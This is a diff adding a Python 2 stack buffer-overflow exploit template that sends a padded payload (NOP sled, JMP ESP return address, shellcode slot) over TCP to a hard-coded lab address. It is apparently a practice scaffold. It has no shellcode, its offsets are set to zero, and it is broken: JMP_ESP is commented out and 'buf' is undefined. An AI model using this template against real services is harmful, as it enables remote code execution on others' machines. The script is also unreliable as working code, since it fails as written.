@@ -1,0 +1,39 @@
+#!/usr/bin/python
+
+import sys, socket
+from time import sleep
+import struct
+
+packer = lambda x : struct.pack('I', x)
+
+TARGET = '192.168.140.141'
+PORT = 1234
+PATH = '/'
+
+CRASH_LEN = 0
+OVERFLOW_LEN = 0
+
+# JMP_ESP = packer(0x??) 
+NOP_SLED = "\x90" * 32
+
+# buffer = "A" * OVERFLOW_LEN + "B" * 4 + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)
+# buffer = "A" * OVERFLOW_LEN + JMP_ESP + "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP))
+
+shellcode =  ""
+
+junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(buf) - len(NOP_SLED))
+buffer = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + shellcode + junk
+
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2)
+    s.connect((TARGET, PORT))
+    data = s.recv(1024)
+    s.send(PATH + buffer)
+    data = s.recv(1024)
+    s.close()
+    sleep(1)
+except Exception as e:
+    print(e)
+    sys.exit()
